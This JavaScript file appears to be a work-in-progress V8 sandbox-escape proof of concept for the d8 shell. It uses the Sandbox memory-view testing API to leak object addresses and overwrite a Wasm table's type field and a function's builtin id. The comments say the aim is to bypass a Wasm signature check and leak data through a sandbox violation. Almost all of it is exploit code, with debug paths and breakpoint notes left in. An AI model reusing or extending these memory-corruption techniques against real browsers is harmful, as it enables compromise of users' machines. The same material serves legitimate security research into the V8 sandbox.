
// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t12.js


d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 32;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let sandbox_base = Sandbox.base
console.log("sandbox_base: 0x" + sandbox_base.toString(16));

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
let $mem0 = builder.addMemory(1, 1);

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
let $struct = builder.addStruct([makeField(kWasmI32, true)]);

const leakCount = 2;
let a =  Array(leakCount).fill(kWasmI64);
let b = [];

let $sig_leak = builder.addType(makeSig([],a)); // func1's arguments
let $sig_v_v = builder.addType(makeSig([], b));// func0's arguments

// %SystemBreak();

let $f0 = builder.addFunction("func0", $sig_v_v)
  .exportFunc()
  .addBody([
  ]);

let $f1 = builder.addFunction("func1", $sig_leak)
    .exportFunc()
    .addBody([
        kExprI64Const, 0x20,
        kExprI64Const, 0,
    ]);


// ==================================================
let array = builder.addArray(kWasmI32, true);
let $sig_array = builder.addType( makeSig([wasmRefNullType(array), kWasmI32], [kWasmI32]));
let $a0 = builder.addFunction(
  "arrayGet", makeSig([wasmRefNullType(array), kWasmI32], [kWasmI32]))
.addBody([kExprLocalGet, 0, kExprLocalGet, 1,
          kGCPrefix, kExprArrayGet, array])
.exportFunc();

// %DebugPrint($f1);

let $t0 =
    builder.addTable(wasmRefType($sig_leak), 1, 1, [kExprRefFunc, $f1.index]);
builder.addExportOfKind("table0", kExternalTable, $t0.index);

builder.addFunction("boom", $sig_leak) // aims to call func1
  .exportFunc()
  .addBody([
    kExprI32Const, 0,  // func index
    kExprCallIndirect, $sig_leak, kTableZero, // kTableZero=0
  ]); // call func0 

let instance = builder.instantiate();

let boom = instance.exports.boom;
let func0 = instance.exports.func0;
let table0 = instance.exports.table0;
let func1 = instance.exports.func1;
let arrayGet = instance.exports.arrayGet;

// %DebugPrint(instance.exports.func1);
// %DebugPrint(instance.exports.func0);
%DebugPrint(instance.exports.boom);
console.log("Output func1: " + instance.exports.func1());
// %DebugPrint(table0);
// %SystemBreak();
// Corrupt the table's type to accept putting $func0 into it.
let t0 = getPtr(table0);
const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;
let expected_old_type = (($sig_leak << kHeapTypeShift) | kRef) << kSmiTagSize;
let new_type = (($sig_v_v << kHeapTypeShift) | kRef) << kSmiTagSize;


// setField(t0, kWasmTableObjectTypeOffset, new_type);
// setting type before setting func0
let changed_func = arrayGet;
let id_builtins_function = Number(getField(getPtr(changed_func), 0xb+1));
console.log("0x" + id_builtins_function.toString(16));

/*
b*0x555556ae74d3
condition 1  (($rcx & 0xFFFFFF) == 0x16690)
*/
setField((getPtr(changed_func)), 0xb+1, id_builtins_function - (0x15fc-0x1669)*0x200);

// This should run into a signature check that kills the process.
// table0.set(0, func1);
// func1();
changed_func(1, 0x41414141n);
// call func1 with func0's arguments


// If the process was still alive, this would cause the sandbox violation.
// let leak = instance.exports.boom();

// console.log("Leak: 0x" + leak[1].toString(16));
// ====================================================